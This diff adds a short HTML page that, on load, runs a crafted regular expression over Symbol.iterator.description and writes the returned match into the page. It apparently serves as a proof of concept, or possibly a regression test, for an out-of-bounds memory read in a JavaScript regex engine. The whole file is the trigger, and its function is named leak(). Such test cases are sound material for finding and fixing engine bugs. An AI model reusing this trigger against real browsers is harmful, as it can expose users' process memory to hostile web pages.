@@ -1,0 +1,23 @@
+<html>
+  <head>
+  </head>
+  <body onload="leak()">
+    <script>
+	  function leak(){
+		  let size = 0x10000;
+		  
+		  var R = new RegExp( "((ite(r)ato\\3[^]{1,"+size+"}))" );	
+		  let source = Symbol.iterator.description;
+		  
+		  var ret = ''
+		  source.replace(R, (match) => {
+			  ret = match;
+		  });
+
+		  document.write(ret);
+	  }
+	</script>
+  </body>
+</html>
+
+
